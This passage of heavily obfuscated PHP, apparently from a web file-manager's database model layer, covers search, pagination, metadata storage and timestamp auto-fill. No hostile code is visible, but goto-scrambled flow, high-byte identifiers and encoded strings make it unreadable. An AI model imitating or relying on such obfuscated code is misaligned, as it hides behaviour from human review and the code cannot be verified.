$C„›ÎåÅ², $E°•Ë®âØÅ) { goto DåÉàßÔ¨Ñ; F‰Ä¨åÃë£: $eëçŠøŸéò = array_diff($E°•Ë®âØÅ, $BÜ¨íäÏ–); if (!$eëçŠøŸéò) { return; } $bóìÊ·êªù = array($f‡­ÚùĞòŠ[369] => array($f‡­ÚùĞòŠ[7], $eëçŠøŸéò)); goto AâŒŞÈŒöŞ; B½‘Ÿ§äğ: foreach ($cáá’Óîé as $f‰åÀõ—µ®) { $e›Ö„”Áâ¶ = $f‡­ÚùĞòŠ[47] . $b™‘ìØ‚ÍË[$f‡­ÚùĞòŠ[461]] . $f‡­ÚùĞòŠ[47]; if (stripos($f‰åÀõ—µ®[$f‡­ÚùĞòŠ[459]], $e›Ö„”Áâ¶) !== !1) { $eóˆ›æ£¡Å[] = $f‰åÀõ—µ®; } } $eĞŸº×›¸Ä[$f‡­ÚùĞòŠ[354]] = array_merge($eóˆ›æ£¡Å, $eĞŸº×›¸Ä[$f‡­ÚùĞòŠ[354]]); $eĞŸº×›¸Ä[$f‡­ÚùĞòŠ[351]][$f‡­ÚùĞòŠ[352]] += count($eóˆ›æ£¡Å); goto Bã‘’ô‹; AâŒŞÈŒöŞ: $cáá’Óîé = $this->field($C„›ÎåÅ²)->where($bóìÊ·êªù)->select(); if (!$cáá’Óîé) { return; } $eóˆ›æ£¡Å = array(); goto B½‘Ÿ§äğ; DåÉàßÔ¨Ñ: $f‡­ÚùĞòŠ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$E°•Ë®âØÅ) { return; } $BÜ¨íäÏ– = array_to_keyvalue($eĞŸº×›¸Ä[$f‡­ÚùĞòŠ[354]], $f‡­ÚùĞòŠ[33], $f‡­ÚùĞòŠ[369]); goto F‰Ä¨åÃë£; Bã‘’ô‹: } public function listSearchChildren($eêåæâİ—, $eáÍª±’ô = 5000) { goto CùÃìçÌÜ¸; eªÈºæ‡Ç·: $a’à¼šñå = $this->field($a°´Ò¼Ÿ…Ÿ[369])->where($B¬åß‰œ)->select(); $CõµÀ™æìÂ = array_to_keyvalue($a’à¼šñå, $a°´Ò¼Ÿ…Ÿ[33], $a°´Ò¼Ÿ…Ÿ[369]); return $CõµÀ™æìÂ; goto E¯…”ì«äÂ; CùÃìçÌÜ¸: $a°´Ò¼Ÿ…Ÿ =& $_SERVER[¼€¼ˆ¦‚¡]; $CõµÀ™æìÂ = array(); $EÂ¤Èé–Š™ = $this->sourceInfo($eêåæâİ—); goto C³˜åÈ…Íï; C³˜åÈ…Íï: $B¬åß‰œ = array($a°´Ò¼Ÿ…Ÿ[459] => array($a°´Ò¼Ÿ…Ÿ[748], $EÂ¤Èé–Š™[$a°´Ò¼Ÿ…Ÿ[459]] . $EÂ¤Èé–Š™[$a°´Ò¼Ÿ…Ÿ[369]] . $a°´Ò¼Ÿ…Ÿ[484])); $DœÖ©øù´ˆ = $this->field($a°´Ò¼Ÿ…Ÿ[369])->cache(null, 600)->where($B¬åß‰œ)->count(); if ($DœÖ©øù´ˆ > $eáÍª±’ô) { return $this->_listSearchChildrenNear($eêåæâİ—, $eáÍª±’ô); } goto eªÈºæ‡Ç·; E¯…”ì«äÂ: } private function _listSearchChildrenNear($E«Ù»ÈÕ‰, $C÷Ñ¶¡‚Äñ) { goto fÊÔ†ªñ£ñ; fÊÔ†ªñ£ñ: $dÒÆÆ¹ì´¬ =& $_SERVER[¼€¼ˆ¦‚¡]; $FÛÊ†§Şà = array(); $D¢Ì—ˆ•Ü = array($dÒÆÆ¹ì´¬[461] => $E«Ù»ÈÕ‰); goto DÏ«î™¾Ù; A£Ó˜ŸˆŠ¢: $FÛÊ†§Şà = array_merge($FÛÊ†§Şà, array_to_keyvalue($D¿¦¥¼õµç, $dÒÆÆ¹ì´¬[33], $dÒÆÆ¹ì´¬[369])); $FÛÊ†§Şà = array_slice($FÛÊ†§Şà, 0, $C÷Ñ¶¡‚Äñ); return $FÛÊ†§Şà; goto F–Õğ¸íç; f²õàÁï´: if (!$F¶éòÚõÅ©) { return $FÛÊ†§Şà; } $D¢Ì—ˆ•Ü = array($dÒÆÆ¹ì´¬[461] => array($dÒÆÆ¹ì´¬[7], $F¶éòÚõÅ©)); $D¿¦¥¼õµç = $this->field($dÒÆÆ¹ì´¬[2319])->where($D¢Ì—ˆ•Ü)->select(); goto A£Ó˜ŸˆŠ¢; DÏ«î™¾Ù: $D¿¦¥¼õµç = $this->field($dÒÆÆ¹ì´¬[2319])->where($D¢Ì—ˆ•Ü)->select(); $F¶éòÚõÅ© = array_to_keyvalue(array_filter_by_field($D¿¦¥¼õµç, $dÒÆÆ¹ì´¬[370], $dÒÆÆ¹ì´¬[83]), $dÒÆÆ¹ì´¬[33], $dÒÆÆ¹ì´¬[369]); $FÛÊ†§Şà = array_merge($FÛÊ†§Şà, array_to_keyvalue($D¿¦¥¼õµç, $dÒÆÆ¹ì´¬[33], $dÒÆÆ¹ì´¬[369])); goto f²õàÁï´; F–Õğ¸íç: } private function _listSearchBindPinyin($EÙ‹èîÌÃ±, &$AÉÎÓÚ¿˜, &$D¡ÑŠîïİ) { goto BçšùåÍˆä; FôØÔôèë­: $aÑ¼ÁÉöÑÜ[] = array($b…ÂôØÈ˜§[2323] => $D½¬Ãˆœ‰Ê, $b…ÂôØÈ˜§[913] => $b…ÂôØÈ˜§[2187], array($b…ÂôØÈ˜§[2324] => $D½¬Ãˆœ‰Ê, $b…ÂôØÈ˜§[2325] => array($b…ÂôØÈ˜§[7], array($b…ÂôØÈ˜§[416], $b…ÂôØÈ˜§[415])))); $this->join($a‘Á«†àÉÓ); $AÉÎÓÚ¿˜ = $aÑ¼ÁÉöÑÜ; goto b´‹õ”Ãğá; AØĞ·³…Ğ: $aÑ¼ÁÉöÑÜ = array(); $D¡ÑŠîïİ = str_replace(array($b…ÂôØÈ˜§[217], $b…ÂôØÈ˜§[50], $b…ÂôØÈ˜§[2320]), $b…ÂôØÈ˜§[33], $D¡ÑŠîïİ); $D¡ÑŠîïİ = $b…ÂôØÈ˜§[2321] . str_replace($b…ÂôØÈ˜§[47], $b…ÂôØÈ˜§[2322], $D¡ÑŠîïİ); goto Cèš¨ß´­”; Cèš¨ß´­”: unset($AÉÎÓÚ¿˜[$b…ÂôØÈ˜§[28]]); foreach ($AÉÎÓÚ¿˜ as $CÀÄ„•† => $EØà÷»’²ƒ) { $aÑ¼ÁÉöÑÜ[$b…ÂôØÈ˜§[2321] . $CÀÄ„•†] = $EØà÷»’²ƒ; } $D½¬Ãˆœ‰Ê = array($b…ÂôØÈ˜§[483], $b…ÂôØÈ˜§[2185] . $EÙ‹èîÌÃ±[$b…ÂôØÈ˜§[2183]] . $b…ÂôØÈ˜§[2185]); goto FôØÔôèë­; BçšùåÍˆä: $b…ÂôØÈ˜§ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!Input::check($EÙ‹èîÌÃ±[$b…ÂôØÈ˜§[2183]], $b…ÂôØÈ˜§[306]) || strlen($EÙ‹èîÌÃ±[$b…ÂôØÈ˜§[2183]]) < 2) { return; } $a‘Á«†àÉÓ = "\114\105\x46\124\40\112\117\111\116\x20{$this->tablePrefix}\x69\x6f\x5f\163\157\x75\x72\x63\145\137\x6d\145\164\x61\40\155\145\164\x61\40\157\x6e\40\163\x6f\165\162\143\x65\x2e\163\x6f\x75\x72\143\145\x49\x44\x20\x3d\40\155\x65\164\141\x2e\x73\157\165\162\143\145\x49\104"; goto AØĞ·³…Ğ; b´‹õ”Ãğá: } private function _parseSearchWhere($eİ†³ƒ—Ô‘) { goto Fó“Ä†ÉŠÜ; Cä†ÛØ‘ø±: if (isset($eİ†³ƒ—Ô‘[$aç„—´æÇ[699]])) { $dÑñ³ğØ„Ö = array($aç„—´æÇ[2327], $eİ†³ƒ—Ô‘[$aç„—´æÇ[699]]); if ($cå²‹ÈÑù£[$aç„—´æÇ[107]]) { $cå²‹ÈÑù£[$aç„—´æÇ[107]] = array($cå²‹ÈÑù£[$aç„—´æÇ[107]], $dÑñ³ğØ„Ö, $aç„—´æÇ[2328]); } else { $cå²‹ÈÑù£[$aç„—´æÇ[107]] = $dÑñ³ğØ„Ö; } } if (isset($eİ†³ƒ—Ô‘[$aç„—´æÇ[2329]])) { $cå²‹ÈÑù£[$aç„—´æÇ[77]] = array($aç„—´æÇ[2326], $eİ†³ƒ—Ô‘[$aç„—´æÇ[2329]]); } if (isset($eİ†³ƒ—Ô‘[$aç„—´æÇ[2330]])) { $dÑñ³ğØ„Ö = array($aç„—´æÇ[2327], $eİ†³ƒ—Ô‘[$aç„—´æÇ[2330]]); if ($cå²‹ÈÑù£[$aç„—´æÇ[77]]) { $cå²‹ÈÑù£[$aç„—´æÇ[77]] = array($cå²‹ÈÑù£[$aç„—´æÇ[77]], $dÑñ³ğØ„Ö, $aç„—´æÇ[2328]); } else { $cå²‹ÈÑù£[$aç„—´æÇ[77]] = $dÑñ³ğØ„Ö; } } goto d±İĞŞ—á•; DÙÂŒ‘ó©: if (isset($eİ†³ƒ—Ô‘[$aç„—´æÇ[2183]]) && $eİ†³ƒ—Ô‘[$aç„—´æÇ[2183]]) { $A©”Èø– = $eİ†³ƒ—Ô‘[$aç„—´æÇ[2183]]; $FÌ±ŞÒˆ˜­ = explode($aç„—´æÇ[50], $A©”Èø–); if (strlen($A©”Èø–) > 2 && (substr($A©”Èø–, 0, 1) == $aç„—´æÇ[113] && substr($A©”Èø–, -1) == $aç„—´æÇ[113]) || substr($A©”Èø–, 0, 1) == $aç„—´æÇ[55] && substr($A©”Èø–, -1) == $aç„—´æÇ[55]) { $A©”Èø– = substr($A©”Èø–, 1, -1); $FÌ±ŞÒˆ˜­ = array($A©”Èø–); } $cå²‹ÈÑù£[$aç„—´æÇ[28]] = array($aç„—´æÇ[483], $aç„—´æÇ[2185] . $A©”Èø– . $aç„—´æÇ[2185]); if (count($FÌ±ŞÒˆ˜­) > 1) { $cå²‹ÈÑù£[$aç„—´æÇ[28]] = array(); foreach ($FÌ±ŞÒˆ˜­ as $CÚ’Š¾—’) { if (!trim($CÚ’Š¾—’)) { continue; } $cå²‹ÈÑù£[$aç„—´æÇ[28]][] = array($aç„—´æÇ[483], $aç„—´æÇ[2185] . trim($CÚ’Š¾—’) . $aç„—´æÇ[2185]); } } } return $cå²‹ÈÑù£; goto c¸ÛŒİàö; Fó“Ä†ÉŠÜ: $aç„—´æÇ =& $_SERVER[¼€¼ˆ¦‚¡]; $cå²‹ÈÑù£ = array(); if (isset($eİ†³ƒ—Ô‘[$aç„—´æÇ[698]])) { $cå²‹ÈÑù£[$aç„—´æÇ[107]] = array($aç„—´æÇ[2326], $eİ†³ƒ—Ô‘[$aç„—´æÇ[698]]); } goto Cä†ÛØ‘ø±; d±İĞŞ—á•: if (isset($eİ†³ƒ—Ô‘[$aç„—´æÇ[535]])) { $cå²‹ÈÑù£[] = array($aç„—´æÇ[379] => $eİ†³ƒ—Ô‘[$aç„—´æÇ[535]], $aç„—´æÇ[378] => $eİ†³ƒ—Ô‘[$aç„—´æÇ[535]], $aç„—´æÇ[913] => $aç„—´æÇ[2187]); } if (isset($eİ†³ƒ—Ô‘[$aç„—´æÇ[372]])) { $F‚Î·‡©… = $eİ†³ƒ—Ô‘[$aç„—´æÇ[372]]; if ($F‚Î·‡©… == $aç„—´æÇ[76]) { $cå²‹ÈÑù£[$aç„—´æÇ[370]] = 1; } else { if ($F‚Î·‡©… == $aç„—´æÇ[2331]) { $cå²‹ÈÑù£[$aç„—´æÇ[370]] = 0; } else { if ($F‚Î·‡©…) { $F‚Î·‡©… = is_array($F‚Î·‡©…) ? $F‚Î·‡©… : explode($aç„—´æÇ[47], $F‚Î·‡©…); $cå²‹ÈÑù£[$aç„—´æÇ[372]] = array($aç„—´æÇ[384], $F‚Î·‡©…); $cå²‹ÈÑù£[$aç„—´æÇ[370]] = 0; } } } } if (isset($eİ†³ƒ—Ô‘[$aç„—´æÇ[461]])) { $féŸ ”—Á‹ = $this->sourceInfo($eİ†³ƒ—Ô‘[$aç„—´æÇ[461]]); $cå²‹ÈÑù£[$aç„—´æÇ[525]] = array($aç„—´æÇ[483], $féŸ ”—Á‹[$aç„—´æÇ[459]] . $eİ†³ƒ—Ô‘[$aç„—´æÇ[461]] . $aç„—´æÇ[484]); } goto DÙÂŒ‘ó©; c¸ÛŒİàö: } } goto FõåÂÓÕª; A÷¸ŸªÂéª: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\x69\x66\171\x54\151\x6d\x65", "\164\x69\x6d\145", "\151\156\x73\x65\162\164\54\165\x70\x64\x61\x74\x65", "\146\165\156\x63\x74\x69\157\x6e"), array("\x63\162\145\141\164\145\124\151\x6d\145", "\x74\151\x6d\x65", "\x69\x6e\x73\x65\x72\x74", "\x66\165\156\143\164\151\157\x6e")); public function setDataAuto($b¼ÏÓ½ˆˆµ) { $this->dataAuto = $b¼ÏÓ½ˆˆµ; } public function __construct($C¶÷í†‚ô = '', $A‹êõ“´Ôš = '', $dÈ‹„¾ñƒ = '') { parent::__construct($C¶÷í†‚ô, $A‹êõ“´Ôš, $dÈ‹„¾ñƒ); } public static function textEncode($Cƒ°ô¦Æ‡Ù) { if (!$Cƒ°ô¦Æ‡Ù) { return $Cƒ°ô¦Æ‡Ù; } $AœÙõ†±Ü× = json_encode($Cƒ°ô¦Æ‡Ù); $AœÙõ†±Ü× = preg_replace_callback($_SERVER[¼€¼ˆ¦‚¡][342], function ($aØÎÙ¼ß¡) { return addslashes($aØÎÙ¼ß¡[0]); }, $AœÙõ†±Ü×); return json_decode($AœÙõ†±Ü×); } public static function textDecode($A‹¬ì÷‘±) { $EãÒ±‰‹êÕ =& $_SERVER[¼€¼ˆ¦‚¡]; $BËöÅÂã™ï = json_encode($A‹¬ì÷‘±); $BËöÅÂã™ï = preg_replace_callback($EãÒ±‰‹êÕ[343], function ($CÜ±ó×ğŠÚ) { return $_SERVER[¼€¼ˆ¦‚¡][93]; }, $BËöÅÂã™ï); return json_decode($BËöÅÂã™ï); } protected $tableMeta = array(); protected function _beforeInsert(&$Câµ‰Šâ†, $E™ñÂª†¸Â) { $FÁ«·àšƒ™ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->checkDataAutoHas($FÁ«·àšƒ™[344])) { return; } $this->dataBeforeFilter($Câµ‰Šâ†, $FÁ«·àšƒ™[344]); } protected function _beforeUpdate(&$AôİÀÉô£¬, $c¹õë×­¼Ã) { $FŠå©»Ë =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->checkDataAutoHas($FŠå©»Ë[345])) { return; } $this->dataBeforeFilter($AôİÀÉô£¬, $FŠå©»Ë[345]); } protected function _afterSelect(&$eæíò”æÄ, $d’Ã¾éØñ©) { if (!is_array($eæíò”æÄ)) { return; } if (!$this->checkDataAutoHas($_SERVER[¼€¼ˆ¦‚¡][346])) { return; } foreach ($eæíò”æÄ as &$F™ÍŞï¥‘Õ) { $this->dataAfterFilter($F™ÍŞï¥‘Õ); } } protected function _afterFind(&$dó¯¨ª’ì‰, $aÁ½‚¨õÒ) { if (!is_array($dó¯¨ª’ì‰)) { return; } if (!$this->checkDataAutoHas($_SERVER[¼€¼ˆ¦‚¡][346])) { return; } $this->dataAfterFilter($dó¯¨ª’ì‰); } public function setAutoIncrement($b¤ØëÕòöã) { $A§Óá±ôï¥ = array($this->getPk() => $b¤ØëÕòöã); $CÓ„…½òĞ = $this->data($A§Óá±ôï¥)->add(); if ($CÓ„…½òĞ) { $this->delete($CÓ„…½òĞ); } } public function getAutoIncrement() { $e¯’Ù»÷ = $this->getTableName(); $f…¡Ó¬ŒŸƒ = $this->max($this->getPk()); $eÕ¬Á¿‡¾Â = $this->query("\163\x68\157\167\x20\164\141\x62\154\x65\40\163\164\x61\x74\165\x73\40\x77\x68\x65\x72\x65\x20\116\x61\155\145\75\47{$e¯’Ù»÷}\47"); $f æçªÄ»° = $eÕ¬Á¿‡¾Â[0][$_SERVER[¼€¼ˆ¦‚¡][347]]; $EèÎìÈ‘Öù = max($f…¡Ó¬ŒŸƒ, $f æçªÄ»°); return $EèÎìÈ‘Öù; } protected function _callBefore($cí…’Ë§óŞ, $A¹ó»Ì’ ) { return $this->cacheCallCheck($cí…’Ë§óŞ, $A¹ó»Ì’ , !1); } protected function _callAfter($DÄÄß‘•õ¶, $d³…ö…ùè) { return $this->cacheCallCheck($DÄÄß‘•õ¶, $d³…ö…ùè, !0); } protected function cacheFunctionAlias($a´½ãøáâÚ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($e¯®Ÿï®ë¼, $B¨ä¡Âéé, $AÏ¬Ü„î = false) { $c†‰íâŸÀŒ = $this->cacheFunctionAlias($B¨ä¡Âéé); if (!$c†‰íâŸÀŒ) { return; } foreach ($c†‰íâŸÀŒ as $däÜîÔ²‰¦ => $BºáÍµÚæµ) { $c…§í¬…¯Â = $BºáÍµÚæµ[0]; $d¬Âœºêâï = explode($_SERVER[¼€¼ˆ¦‚¡][47], $BºáÍµÚæµ[1]); if ($e¯®Ÿï®ë¼ == $däÜîÔ²‰¦) { return $this->cacheFunctionGet($däÜîÔ²‰¦, $c…§í¬…¯Â); } if ($AÏ¬Ü„î && in_array($e¯®Ÿï®ë¼, $d¬Âœºêâï)) { $this->cacheFunctionClear($däÜîÔ²‰¦, $c…§í¬…¯Â); } } } public function cacheFunctionGet($eô“É›‡À, $FŠ‰‡ ¢Ş) { $CÔõå¯¹ğ· = $this->cacheKeyMake($eô“É›‡À, $FŠ‰‡ ¢Ş); $cß˜ÉŠ¡Óš = Cache::get($CÔõå¯¹ğ·); if (!is_array($cß˜ÉŠ¡Óš)) { $cß˜ÉŠ¡Óš = call_user_func_array(array($this, $eô“É›‡À), array($FŠ‰‡ ¢Ş, !0)); Cache::set($CÔõå¯¹ğ·, $cß˜ÉŠ¡Óš); } return $cß˜ÉŠ¡Óš; } public function cacheFunctionClear($bªÓÛù®ñ, $dŒŠ½¬œ) { $b¤•·„ñ = $dŒŠ½¬œ; if (!is_array($dŒŠ½¬œ)) { $b¤•·„ñ = array($dŒŠ½¬œ); } foreach ($b¤•·„ñ as $Aî¶ã¦¸ô) { $c×–ŠšæÓ = $this->cacheKeyMake($bªÓÛù®ñ, $Aî¶ã¦¸ô); Cache::remove($c×–ŠšæÓ); } } private function cacheKeyMake($A‡•÷éóÕ, $fõ·‰ã—…‰) { $D¬ïËÒˆ÷Â =& $_SERVER[¼€¼ˆ¦‚¡]; return get_class($this) . $D¬ïËÒˆ÷Â[70] . $A‡•÷éóÕ . $D¬ïËÒˆ÷Â[348] . $fõ·‰ã—…‰; } protected function selectPage($dê ¡ëÏ–• = 200, $AàÔ„‘›±… = 1) { goto a…îëâ†¬ô; d¶Ë¸ òé: $eğÍš’ÛËí = ceil($cÃ£”à•¡Â / $dê ¡ëÏ–•); $AàÔ„‘›±… = intval(isset($in[$CÂ’—®¸ÒÁ[340]]) ? $in[$CÂ’—®¸ÒÁ[340]] : $AàÔ„‘›±…); $AàÔ„‘›±… = $AàÔ„‘›±… <= 1 ? 1 : ($AàÔ„‘›±… >= $eğÍš’ÛËí ? $eğÍš’ÛËí : $AàÔ„‘›±…); goto EìÇ¥¾¡å‘; a…îëâ†¬ô: $CÂ’—®¸ÒÁ =& $_SERVER[¼€¼ˆ¦‚¡]; global $in; $fÈˆÀåÙî‘ = $this->optionsValue(); goto c„•ğ¶ÚĞ; B˜æ«•²‡: $bŒÄ–¹Éğ = $fÈˆÀåÙî‘; $bŒÄ–¹Éğ[$CÂ’—®¸ÒÁ[350]] = array(); $this->optionsValue($bŒÄ–¹Éğ); goto eø¾â®à†Õ; c„•ğ¶ÚĞ: $f‰‰¬Ô‹² = 4000; $dê ¡ëÏ–• = isset($in[$CÂ’—®¸ÒÁ[349]]) ? $in[$CÂ’—®¸ÒÁ[349]] : $dê ¡ëÏ–•; if ($dê ¡ëÏ–• === -1) { unset($in[$CÂ’—®¸ÒÁ[349]]); $f‰‰¬Ô‹² = 100000000; $dê ¡ëÏ–• = $f‰‰¬Ô‹²; } goto B˜æ«•²‡; EìÇ¥¾¡å‘: $this->optionsValue($fÈˆÀåÙî‘); $bñøÙº›¢Ü = $this->page($AàÔ„‘›±…, $dê ¡ëÏ–•)->select(); $bñøÙº›¢Ü = is_array($bñøÙº›¢Ü) ? $bñøÙº›¢Ü : array(); goto f‰¶Š¼œ³ã; f‰¶Š¼œ³ã: if ($eğÍš’ÛËí == 1) { $cÃ£”à•¡Â = count($bñøÙº›¢Ü); } $B×’»ÁæêÊ = array($CÂ’—®¸ÒÁ[351] => array($CÂ’—®¸ÒÁ[352] => $cÃ£”à•¡Â, $CÂ’—®¸ÒÁ[349] => $dê ¡ëÏ–•, $CÂ’—®¸ÒÁ[340] => $AàÔ„‘›±…, $CÂ’—®¸ÒÁ[353] => $eğÍš’ÛËí), $CÂ’—®¸ÒÁ[354] => $bñøÙº›¢Ü ? $bñøÙº›¢Ü : array()); return $B×’»ÁæêÊ; goto Aõé°ª‚Ì; eø¾â®à†Õ: $cÃ£”à•¡Â = intval($this->count()); $dê ¡ëÏ–• = intval($dê ¡ëÏ–•); $dê ¡ëÏ–• = $dê ¡ëÏ–• <= 5 ? 5 : ($dê ¡ëÏ–• >= $f‰‰¬Ô‹² ? $f‰‰¬Ô‹² : $dê ¡ëÏ–•); goto d¶Ë¸ òé; Aõé°ª‚Ì: } protected function checkLength($eõé…ùÜ‘Û, $CŠ‘±ÓÑñ = 0, $A©‘° Ãƒ = '') { $d¸™£âÃŠÎ =& $_SERVER[¼€¼ˆ¦‚¡]; $CŠ‘±ÓÑñ = $CŠ‘±ÓÑñ ? $CŠ‘±ÓÑñ : 65536; if (!$eõé…ùÜ‘Û || strlen($eõé…ùÜ‘Û) < $CŠ‘±ÓÑñ) { return; } $A©‘° Ãƒ = $A©‘° Ãƒ ? $A©‘° Ãƒ . $d¸™£âÃŠÎ[67] : $d¸™£âÃŠÎ[33]; show_json($A©‘° Ãƒ . LNG($d¸™£âÃŠÎ[355]) . "\x28{$CŠ‘±ÓÑñ}\51", !1); } protected function metaSet($b¤ºÍÒÚ‰, $f‚ô„äãæ = null, $e§§˜êƒÌ“ = null) { goto DãÜ‘Ÿ¯•; DãÜ‘Ÿ¯•: $BĞç¾ÆŠÀ… =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->tableMeta) { return !1; } $BÏŒ¸ÉãËó = $this->tableMeta[$BĞç¾ÆŠÀ…[356]]; goto bÙÅÜ‚‡Ãô; CÎë‘‚ÔŒº: $A‡Ù—‹Ÿù->where(array($BÏŒ¸ÉãËó => $b¤ºÍÒÚ‰))->addAll($Fà‘¢“­êÂ, array(), !0); return !0; goto câ„×Üµ†¾; a¿ƒ„‚ÛÊ†: if (is_null($f‚ô„äãæ)) { return $A‡Ù—‹Ÿù->where(array($BÏŒ¸ÉãËó => $b¤ºÍÒÚ‰))->delete(); } if (is_null($e§§˜êƒÌ“) && is_string($f‚ô„äãæ)) { return $A‡Ù—‹Ÿù->where($E§Û»™ä¦õ)->delete(); } $eÊÈ…–×¡± = is_array($f‚ô„äãæ) ? $f‚ô„äãæ : array(); goto a®İâ¬³‚„; bÙÅÜ‚‡Ãô: $bÑ¶Â®ÃĞ¡ = $this->tableMeta[$BĞç¾ÆŠÀ…[357]]; $A‡Ù—‹Ÿù = Model($bÑ¶Â®ÃĞ¡); $E§Û»™ä¦õ = array($BÏŒ¸ÉãËó => $b¤ºÍÒÚ‰, $BĞç¾ÆŠÀ…[358] => $f‚ô„äãæ); goto a¿ƒ„‚ÛÊ†; a®İâ¬³‚„: if (is_string($f‚ô„äãæ)) { $eÊÈ…–×¡±[$f‚ô„äãæ] = $e§§˜êƒÌ“; } $Fà‘¢“­êÂ = array(); foreach ($eÊÈ…–×¡± as $f•øÖØøÕ¦ => $aÙ›‹„¡õ) { $this->checkLength($aÙ›‹„¡õ, !1, $bÑ¶Â®ÃĞ¡ . $BĞç¾ÆŠÀ…[4] . $f•øÖØøÕ¦); $Fà‘¢“­êÂ[] = array($BÏŒ¸ÉãËó => $b¤ºÍÒÚ‰, $BĞç¾ÆŠÀ…[89] => $f•øÖØøÕ¦, $BĞç¾ÆŠÀ…[359] => $aÙ›‹„¡õ); } goto CÎë‘‚ÔŒº; câ„×Üµ†¾: } public function metaGet($FƒËáø°Ê) { goto a‰ñ£ÌÒÛÔ; a‰ñ£ÌÒÛÔ: $CĞ‚Ÿ¸àòµ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->tableMeta) { return array(); } $D£ËêÓ = $this->tableMeta[$CĞ‚Ÿ¸àòµ[356]]; goto e÷‚»÷›ò; aƒèóßŠØ: $DâÕî™´‰ = array_to_keyvalue($DâÕî™´‰, $CĞ‚Ÿ¸àòµ[89], $CĞ‚Ÿ¸àòµ[359]); return $DâÕî™´‰; goto EïãÖŠÄ¡; e÷‚»÷›ò: $aè¾×Úéç£ = Model($this->tableMeta[$CĞ‚Ÿ¸àòµ[357]]); $fŒÒÉ§ÀµŒ = array($D£ËêÓ => $FƒËáø°Ê); $DâÕî™´‰ = $aè¾×Úéç£->field($CĞ‚Ÿ¸àòµ[360])->where($fŒÒÉ§ÀµŒ)->select(); goto aƒèóßŠØ; EïãÖŠÄ¡: } private function checkDataAutoHas($b›Ş·ÁâÇ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Eæ™×æ“¤œ) { if (in_array($b›Ş·ÁâÇ, explode($_SERVER[¼€¼ˆ¦‚¡][47], $Eæ™×æ“¤œ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$B¿éŞÁÁ÷¨, $A÷‰ˆÁ§î) { $aÄ¶êğÕñ =& $_SERVER[¼€¼ˆ¦‚¡]; foreach ($this->dataAuto as $cóˆÙˆ­È¥) { $bäÊ†š¿ñ = $cóˆÙˆ­È¥[0]; if (!in_array($A÷‰ˆÁ§î, explode($aÄ¶êğÕñ[47], $cóˆÙˆ­È¥[2]))) { continue; } switch (trim($cóˆÙˆ­È¥[3])) { case $aÄ¶êğÕñ[309]: case $aÄ¶êğÕñ[310]: $dæÄœŞ¡Ê® = $cóˆÙˆ­È¥[1]; $e…­Ø‘„š¡ = isset($cóˆÙˆ­È¥[4]) ? (array) $cóˆÙˆ­È¥[4] : array(); if ($dæÄœŞ¡Ê® == $aÄ¶êğÕñ[190] && array_key_exists($bäÊ†š¿ñ, $B¿éŞÁÁ÷¨)) { if (!$B¿éŞÁÁ÷¨[$bäÊ†š¿ñ]) { unset($B¿éŞÁÁ÷¨[$bäÊ†š¿ñ]); } break; } if (isset($B¿éŞÁÁ÷¨[$bäÊ†š¿ñ])) { array_unshift($e…­Ø‘„š¡, $B¿éŞÁÁ÷¨[$bäÊ†š¿ñ]); } if ($aÄ¶êğÕñ[309] == $cóˆÙˆ­È¥[3]) { $B¿éŞÁÁ÷¨[$bäÊ†š¿ñ] = call_user_func_array($dæÄœŞ¡Ê®, $e…­Ø‘„š¡); } else { $B¿éŞÁÁ÷¨[$bäÊ†š¿ñ] = call_user_func_array(array(&$this, $dæÄœŞ¡Ê®), $e…­Ø‘„š¡); } break; case $aÄ¶êğÕñ[261]: $B¿éŞÁÁ÷¨[$bäÊ†š¿ñ] = $B¿éŞÁÁ÷¨[$cóˆÙˆ­È¥[1]]; break; case $aÄ¶êğÕñ[282]: if (isset($B¿éŞÁÁ÷¨[$bäÊ†š¿ñ]) && !is_string($B¿éŞÁÁ÷¨[$bäÊ†š¿ñ])) { $B¿éŞÁÁ÷¨[$bäÊ†š¿ñ] = json_encode_force($B¿éŞÁÁ÷¨[$bäÊ†š¿ñ]); } break; case $aÄ¶êğÕñ[311]: if ($B¿éŞÁÁ÷¨[$bäÊ†š¿ñ] === $aÄ¶êğÕñ[33]) { unset($B¿éŞÁÁ÷¨[$bäÊ†š¿ñ]); } break; case $aÄ¶êğÕñ[312]: $B¿éŞÁÁ÷¨[$bäÊ†š¿ñ] = $cóˆÙˆ­È¥[1]; default: break; } } if ($A÷‰ˆÁ§î == $aÄ¶êğÕñ[344]) { $c—‰®éöŒã = strtolower($this->db->getDbType()); if (strpos($c—‰®éöŒã, $aÄ¶êğÕñ[9]) !== 0) { return; } $A‚ôÃ¡‰‹ = $this->field(!0)->fields; $dùĞòªµ×å = $A‚ôÃ¡‰‹[$aÄ¶êğÕñ[240]]; if (isset($A‚ôÃ¡‰‹[$aÄ¶êğÕñ[239]])) { unset($dùĞòªµ×å[$A‚ôÃ¡‰‹[$aÄ¶êğÕñ[239]]]); } foreach ($dùĞòªµ×å as $Föì‰Òñ‹í => $A÷‰ˆÁ§î) { if (!isset($B¿éŞÁÁ÷¨[$Föì‰Òñ‹í])) { $B¿éŞÁÁ÷¨[$Föì‰Òñ‹í] = $aÄ¶êğÕñ[33]; } } } } private function dataAfterFilter(&$CÈ‹®ºõ§¦) { $D§„ÚããÉƒ =& $_SERVER[¼€¼ˆ¦‚¡]; foreach ($this->dataAuto as $Bôøá³°×™) { $B¸¡ŠçÒÀŒ = $Bôøá³°×™[0]; if (!in_array($D§„ÚããÉƒ[346], explode($D§„ÚããÉƒ[47], $Bôøá³°×™[2]))) { continue; } if (!isset($CÈ‹®ºõ§¦[$B¸¡ŠçÒÀŒ])) { continue; } switch (trim($Bôøá³°×™[3])) { case $D§„ÚããÉƒ[309]: case $D§„ÚããÉƒ[310]: $EÖîœ÷Åğ¦ = isset($Bôøá³°×™[4]) ? (array) $Bôøá³°×™[4] : array(); array_unshift($EÖîœ÷Åğ¦, $CÈ‹®ºõ§¦[$B¸¡ŠçÒÀŒ]); if ($D§„ÚããÉƒ[309] == 